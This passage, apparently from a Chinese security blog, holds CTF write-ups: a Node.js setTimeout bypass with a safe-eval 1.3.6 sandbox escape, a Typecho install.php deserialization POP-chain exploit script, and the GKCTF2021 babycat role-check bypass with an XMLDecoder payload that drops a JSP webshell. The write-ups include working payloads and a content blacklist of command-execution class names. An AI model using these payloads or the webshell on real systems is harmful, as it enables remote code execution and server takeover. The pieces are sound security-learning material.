    <span class="token keyword">let</span> delay <span class="token operator">=</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>delay<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>Number<span class="token punctuation">.</span><span class="token function">isInteger</span><span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>delay<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      delay <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>delay<span class="token punctuation">,</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>delay<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">const</span> t <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> delay<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">// 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事</span>
    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
      <span class="token function">clearTimeout</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'timeout'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">try</span> <span class="token punctuation">{</span>
        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Timeout!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/eval'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">let</span> response <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">try</span> <span class="token punctuation">{</span>
      response <span class="token operator">=</span> <span class="token function">saferEval</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      response <span class="token operator">=</span> <span class="token string">'Wrong Wrong Wrong!!!!'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token function">String</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI</span>
app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/source'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  res<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span><span class="token string">'Content-Type'</span><span class="token punctuation">,</span> <span class="token string">'text/javascript;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'./index.js'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">// 2019.12/WORKER3 为了方便我自己查看版本，加上这个接口</span>
app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/version'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  res<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span><span class="token string">'Content-Type'</span><span class="token punctuation">,</span> <span class="token string">'text/json;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'./package.json'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  res<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span><span class="token string">'Content-Type'</span><span class="token punctuation">,</span> <span class="token string">'text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'./index.html'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>

app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span> <span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Start listening'</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<h3 id="setTimeout绕过"><a href="#setTimeout绕过" class="headerlink" title="setTimeout绕过"></a>setTimeout绕过</h3><p>主要逻辑就在那个自己写的中间件上，每一个app.use都是一个中间件，每一个请求发送到nodejs的时候，请求就会依次经过这些中间件，中间件对req和res进行处理，使用res.send结束请求，或是调用next进入下一个中间件，这里代码的关键部分是这一段</p>
<pre class=" language-javascript"><code class="language-javascript"> <span class="token keyword">const</span> t <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> delay<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
      <span class="token function">clearTimeout</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'timeout'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">try</span> <span class="token punctuation">{</span>
        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Timeout!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>之前将delay设置为了<code>Math.max(delay, parseInt(req.query.delay))</code>而这里使用setTimeout调用next函数，接下来又再次使用setTimeout调用clearTimeout来停止计时器，我们需要经过delay的时间才能调用next进入下一个中间件也就是路由，而在delay结束之前，第二个setTimeout函数先计时结束，停止了计时并结束了这次会话<br>需要绕过，查一下资料可知，setTimeout在delay大于2147483647或小于1时，会将delay设置为1<br>这样子就可以在timeout之前调用next，进入下一步了</p>
<h3 id="safe-eval-1-3-6绕过"><a href="#safe-eval-1-3-6绕过" class="headerlink" title="safe-eval 1.3.6绕过"></a>safe-eval 1.3.6绕过</h3><p>在version路由下给出了safe-eval的版本号，1.3.6，大于市面上能直接搜到漏洞的版本，但这并不意味着没有洞，搜一搜还是有的</p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> saferEval <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"./src/index"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> theFunction <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> process <span class="token operator">=</span> clearImmediate<span class="token punctuation">.</span><span class="token function">constructor</span><span class="token punctuation">(</span><span class="token string">"return process;"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> process<span class="token punctuation">.</span>mainModule<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execSync</span><span class="token punctuation">(</span><span class="token string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> untrusted <span class="token operator">=</span> <span class="token template-string"><span class="token string">`(</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>theFunction<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">)()`</span></span><span class="token punctuation">;</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">saferEval</span><span class="token punctuation">(</span>untrusted<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>payload有两种打的形式，一个就直接抄，用自调用函数</p>
<pre class=" language-javascript"><code class="language-javascript">e<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> process <span class="token operator">=</span> clearImmediate<span class="token punctuation">.</span><span class="token function">constructor</span><span class="token punctuation">(</span><span class="token string">"return process;"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> process<span class="token punctuation">.</span>mainModule<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execSync</span><span class="token punctuation">(</span><span class="token string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>另一个可以把内容合并一下短一点</p>
<pre class=" language-javascript"><code class="language-javascript">e<span class="token operator">=</span>clearImmediate<span class="token punctuation">.</span><span class="token function">constructor</span><span class="token punctuation">(</span><span class="token string">"return process;"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>mainModule<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execSync</span><span class="token punctuation">(</span><span class="token string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>沙盒逃逸</tag>
      </tags>
  </entry>
  <entry>
    <title>GKCTF2020 EzTypecho</title>
    <url>/%5BGKCTF2020%5DEzTypecho.html</url>
    <content><![CDATA[<h1 id="GKCTF2020-EzTypecho"><a href="#GKCTF2020-EzTypecho" class="headerlink" title="[GKCTF2020]EzTypecho"></a>[GKCTF2020]EzTypecho</h1><p>暑假恢复刷题，顺便把以前堆积的东西也都更新到博客上，清一下桌面<br>GKCTF这次题感觉好多都是现有CVE之类的东西，然后加一点点<br>题目是一个typecho的安装流程，但是安装到一半就不给安装了，想了半天不知道他想让我怎样才能安装，后来才知道是typecho在安装时install.php有一个反序列化的任意代码执行。<br>最后题目还要求反序列化需要一个session，需要自己想办法建立一个session</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>typecho反序列化的pop链网上都有分析了，抄一个脚本执行任意命令<br><a href="https://www.freebuf.com/vuls/155753.html">https://www.freebuf.com/vuls/155753.html</a></p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$CMD</span> <span class="token operator">=</span> <span class="token string">'system("cat /flag")'</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name">Typecho_Feed</span>
<span class="token punctuation">{</span>
    <span class="token keyword">const</span> <span class="token constant">RSS2</span> <span class="token operator">=</span> <span class="token string">'RSS 2.0'</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">ATOM1</span> <span class="token operator">=</span> <span class="token string">'ATOM 1.0'</span><span class="token punctuation">;</span>

    <span class="token keyword">private</span> <span class="token variable">$_type</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$_items</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment" spellcheck="true">//$this->_type = $this::RSS2;</span>

        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_type</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">ATOM1</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_items</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
            <span class="token string">'category'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Typecho_Request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token string">'author'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">new</span> <span class="token class-name">Typecho_Request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">Typecho_Request</span>
<span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token variable">$_params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$_filter</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_params</span><span class="token punctuation">[</span><span class="token string">'screenName'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token constant">CMD</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_filter</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'assert'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token variable">$exp</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
    <span class="token string">'adapter'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">new</span> <span class="token class-name">Typecho_Feed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token string">'prefix'</span>  <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'typecho_'</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$exp</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span>
</code></pre>
<p>payload添加在cookie或post数据中都可，键名为__typecho_config<br>这里有一个注意点，需要$_GET[‘start’]或$_GET[‘finish’]不为空，且Referer是本站时install.php才会进入反序列化逻辑部分。出题人似乎是在$_GET[‘finish’]这里做了过滤，需要拥有一个session才能触发反序列化，但是如果你用$_GET[‘start’]触发反序列化的话就不需要看后面的内容了</p>
<h2 id="PHP-SESSION-UPLOAD-PROGRESS"><a href="#PHP-SESSION-UPLOAD-PROGRESS" class="headerlink" title="PHP_SESSION_UPLOAD_PROGRESS"></a>PHP_SESSION_UPLOAD_PROGRESS</h2><p>用于跟踪PHP文件上传进度的一个功能，可以通过这个功能自行创建一个session，好像在其他题目中用于条件竞争session文件反序列化来getshell，这里用这个创建一个session进行反序列化就可以了<br>先看一下PHP manual中怎么描述的</p>
<blockquote>
<p>当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是 session.upload_progress.prefix 与 session.upload_progress.name连接在一起的值。</p>
</blockquote>
<p>而session.upload_progress.name的默认值就是PHP_SESSION_UPLOAD_PROGRESS<br>因此我们在触发反序列化的时候同时手搓一个文件上传，并post一个名为PHP_SESSION_UPLOAD_PROGRESS的数据，就可以为当前会话添加一个session</p>
<h2 id="其他东西"><a href="#其他东西" class="headerlink" title="其他东西"></a>其他东西</h2><p>session文件的文件名为sess_+PHPSESSID的值，在默认设置下允许用户自定义PHPSESSID的值，可以创建出对应的session文件，而PHP_SESSION_UPLOAD_PROGRESS的值可控，并会被写入session文件，条件竞争包含getshell</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>session</tag>
        <tag>typecho</tag>
      </tags>
  </entry>
  <entry>
    <title>[GKCTF2021]babycat与XMLDecoder反序列化</title>
    <url>/%5BGKCTF2021%5Dbabycat.html</url>
    <content><![CDATA[<h1 id="GKCTF2021-babycat与XMLDecoder反序列化"><a href="#GKCTF2021-babycat与XMLDecoder反序列化" class="headerlink" title="[GKCTF2021]babycat与XMLDecoder反序列化"></a>[GKCTF2021]babycat与XMLDecoder反序列化</h1><p>java题，有一个非预期版本和一个完全体，由于我垃圾的java基础和审计水平，并没有发现非预期写的垃圾代码，都是按完全体思路去做的</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>注册登录两个路由，注册点了之后会有一个not allowed的烟雾弹，但是其实页面存在且有js提示。但是我直接抓了个登录的包然后改路由到register上成功注册了<br>登录进去之后有两个主要功能，一个上传一个下载，上传要求用户权限admin，而下载是个任意文件下载。一开始并没有意识到这个是java题，还在想是不是nodejs或者python，但是后来看那个默认的图片下载目录穿越了两层目录才下下来，越想越不对劲，感觉可能是java。开始乱按，对java的工作路径和目录结构不是很熟悉，但还是成功摸到<code>../../WEB-INF/web.xml</code>，看到了各个类的路径<br>依次根据各类路径下载class文件，丢到Intellij中反编译。</p>
<h3 id="admin登录"><a href="#admin登录" class="headerlink" title="admin登录"></a>admin登录</h3><p>成为admin的关键代码为这段</p>
<pre class=" language-java"><code class="language-java">String var <span class="token operator">=</span> req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"'"</span><span class="token punctuation">,</span> <span class="token string">"\""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
Pattern pattern <span class="token operator">=</span> Pattern<span class="token punctuation">.</span><span class="token function">compile</span><span class="token punctuation">(</span><span class="token string">"\"role\":\"(.*?)\""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">for</span><span class="token punctuation">(</span>Matcher matcher <span class="token operator">=</span> pattern<span class="token punctuation">.</span><span class="token function">matcher</span><span class="token punctuation">(</span>var<span class="token punctuation">)</span><span class="token punctuation">;</span> matcher<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> role <span class="token operator">=</span> matcher<span class="token punctuation">.</span><span class="token function">group</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token punctuation">}</span>

Person person<span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>StringUtils<span class="token punctuation">.</span><span class="token function">isNullOrEmpty</span><span class="token punctuation">(</span>role<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    var <span class="token operator">=</span> var<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>role<span class="token punctuation">,</span> <span class="token string">"\"role\":\"guest\""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    person <span class="token operator">=</span> <span class="token punctuation">(</span>Person<span class="token punctuation">)</span>gson<span class="token punctuation">.</span><span class="token function">fromJson</span><span class="token punctuation">(</span>var<span class="token punctuation">,</span> Person<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    person <span class="token operator">=</span> <span class="token punctuation">(</span>Person<span class="token punctuation">)</span>gson<span class="token punctuation">.</span><span class="token function">fromJson</span><span class="token punctuation">(</span>var<span class="token punctuation">,</span> Person<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    person<span class="token punctuation">.</span><span class="token function">setRole</span><span class="token punctuation">(</span><span class="token string">"guest"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>先去除空格，再把单引号换成双引号，最后正则匹配role属性，并将匹配到的最后一个role属性替换成guest（我一开始还以为会替换所有），最后用json解析字符串产生person对象<br>有很多的绕过方式</p>
<ol>
<li>Unicode绕过，先整一个没用的role，json在存在多个相同键时最后一个会覆盖之前的值，且支持Unicode编码，<code>&quot;\u0072ole&quot;/**/:&quot;admin&quot;</code>即可</li>
<li>注释符绕过，json支持<code>/**/</code>注释符，在中间塞一个打断正则匹配<code>&quot;role&quot;/**/:&quot;admin&quot;</code></li>
<li>无效属性绕过，因为只替换最后一个，所以在最后套一层没用的属性也可以过<code>&quot;rubish&quot;:&#123;&quot;role&quot;:&quot;admin&quot;&#125;</code></li>
</ol>
<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>文件上传的话限制了后缀为<code>String[] extWhiteList = new String[]&#123;&quot;jpg&quot;, &quot;png&quot;, &quot;gif&quot;, &quot;bak&quot;, &quot;properties&quot;, &quot;xml&quot;, &quot;html&quot;, &quot;xhtml&quot;, &quot;zip&quot;, &quot;gz&quot;, &quot;tar&quot;, &quot;txt&quot;&#125;;</code><br>同时限定了内容黑名单<code>String[] blackList = new String[]&#123;&quot;Runtime&quot;, &quot;exec&quot;, &quot;ProcessBuilder&quot;, &quot;jdbc&quot;, &quot;autoCommit&quot;&#125;;</code><br>成功抵达未知领域</p>
<p>看wp环节，这里提出在login中读取数据库配置文件是使用的xmldecoder类的readObject，读取的是<code>System.getenv(&quot;CATALINA_HOME&quot;) + &quot;/webapps/ROOT/WEB-INF/db/db.xml&quot;)</code>，而这个操作是存在反序列化漏洞的，且文件上传的后缀中允许上传xml文件，我们可以通过上传文件覆盖db.xml来实现反序列化攻击。<br>这里的<code>CATALINA_HOME</code>这个环境变量可以通过读proc文件系统获取，但还需要绕过内容的黑名单进行命令执行，这里使用PrintWriter类写入shell以绕过<br>先放下payload，然后再细说各种原理</p>
<pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>java</span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1.8.0_192<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>java.beans.XMLDecoder<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>object</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>java.io.PrintWriter<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">></span></span>shell.jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>println<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">></span></span>
<span class="token cdata">&lt;![CDATA[
&lt;%!
    class U extends ClassLoader {
        U(ClassLoader c) {
            super(c);
        }
        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }
 
    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception e) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }
%>
&lt;%
    String cls = request.getParameter("passwd");
    if (cls != null) {
        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
    }
%>
]]></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>void</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>close<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>void</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>object</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>java</span><span class="token punctuation">></span></span>
</code></pre>
